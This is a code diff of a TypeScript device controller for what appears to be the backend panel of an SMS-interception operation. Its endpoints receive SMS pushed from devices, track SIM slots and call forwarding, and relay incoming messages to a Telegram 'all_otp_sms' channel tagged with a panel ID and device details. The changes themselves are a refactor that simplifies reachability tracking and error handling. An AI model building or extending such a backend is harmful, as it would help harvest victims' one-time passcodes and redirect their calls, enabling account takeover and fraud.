@@ -7,22 +7,6 @@ import config from "../config";
 import { sendTelegramMessage } from "../services/telegramService";
 import { buildTelegramAllOtpSmsMessage } from "../utils/telegramMessage";
 
-/**
- * deviceController.ts
- *
- * Thin controllers matching the routes.
- * Each controller responds with { success, error? } where appropriate.
- *
- * POST-MIGRATION:
- *   - updateStatus() REMOVED (no more status.online)
- *   - All device reachability handled by lastSeen
- *
- * SENDSMS behavior:
- *   - SENDSMS=no   -> DB save skipped by smsService, no frontend WS notification,
- *                     SMS routed only to Telegram all_otp_sms channel
- *   - SENDSMS=yes  -> normal existing behavior
- */
-
 function clean(v: unknown): string {
   return String(v ?? "").trim();
 }
@@ -34,54 +18,33 @@ function isSendSmsDisabled(): boolean {
   return value === "no";
 }
 
-function computeReachability(lastSeenAt: number): {
-  status: "responsive" | "idle" | "unreachable";
-  lastSeenAt: number;
-  agoMs: number;
-} {
-  const now = Date.now();
-  const agoMs = lastSeenAt > 0 ? now - lastSeenAt : -1;
-
-  let status: "responsive" | "idle" | "unreachable";
-
-  if (lastSeenAt <= 0) {
-    status = "unreachable";
-  } else if (agoMs <= 15 * 60 * 1000) {
-    status = "responsive";
-  } else if (agoMs <= 2 * 60 * 60 * 1000) {
-    status = "idle";
-  } else {
-    status = "unreachable";
-  }
-
-  return { status, lastSeenAt, agoMs };
-}
-
 function getDeviceTelegramMeta(device: any, deviceId: string) {
-  const rawLastSeenAt = Number(
-    device?.lastSeen?.at ??
-      device?.status?.timestamp ??
-      Date.now(),
-  );
-
-  const lastSeenAt =
-    Number.isFinite(rawLastSeenAt) && rawLastSeenAt > 0
-      ? rawLastSeenAt
-      : Date.now();
-
-  const reachability = computeReachability(lastSeenAt);
-
   return {
-    pannelId: (config as any).pannelId || "",
+    pannelId: config.pannelId,
     deviceId,
     brandName: clean(
       device?.metadata?.brand || device?.metadata?.manufacturer || "",
     ),
     model: clean(device?.metadata?.model || ""),
-    online: reachability.status === "responsive",
-    lastSeen: lastSeenAt,
+    online: !!device?.status?.online,
+    lastSeen: Number(
+      device?.lastSeen?.at ||
+        device?.status?.timestamp ||
+        Date.now(),
+    ),
   };
 }
+
+/**
+ * deviceController.ts
+ *
+ * Thin controllers matching the routes.
+ * Each controller responds with { success, error? } where appropriate.
+ *
+ * POST-MIGRATION:
+ *   - updateStatus() REMOVED (no more status.online)
+ *   - All device reachability handled by lastSeen
+ */
 
 export async function upsertDevice(req: Request, res: Response) {
   const deviceId = req.params.deviceId;
@@ -116,9 +79,7 @@ export async function updateLastSeen(req: Request, res: Response) {
           battery: typeof battery === "number" ? battery : -1,
         });
       }
-    } catch {
-      // ignore — admin panel might not be connected
-    }
+    } catch {}
 
     return res.json({ success: true });
   } catch (err: any) {
@@ -143,9 +104,7 @@ export async function updateSimSlot(req: Request, res: Response) {
 
     try {
       await deviceService.touchLastSeen(deviceId, "call_forwarded");
-    } catch {
-      // ignore
-    }
+    } catch {}
 
     return res.json({ success: true });
   } catch (err: any) {
@@ -211,7 +170,6 @@ export async function getForwardingSim(req: Request, res: Response) {
 export async function pushSms(req: Request, res: Response) {
   const id = req.params.id;
   const body = req.body || {};
-
   try {
     const payload = {
       sender: body.sender || body.from || "unknown",
@@ -222,9 +180,7 @@ export async function pushSms(req: Request, res: Response) {
       meta: body.meta || {},
     };
 
-    const sendSmsDisabled = isSendSmsDisabled();
-
-    if (sendSmsDisabled) {
+    if (isSendSmsDisabled()) {
       try {
         const device = await deviceService.getDevice(id);
         const meta = getDeviceTelegramMeta(device, id);
@@ -258,9 +214,7 @@ export async function pushSms(req: Request, res: Response) {
 
       try {
         await deviceService.touchLastSeen(id, "sms_pushed");
-      } catch {
-        // ignore
-      }
+      } catch {}
 
       return res.json({
         success: true,
@@ -274,9 +228,7 @@ export async function pushSms(req: Request, res: Response) {
 
     try {
       await deviceService.touchLastSeen(id, "sms_pushed");
-    } catch {
-      // ignore
-    }
+    } catch {}
 
     return res.json({
       success: true,
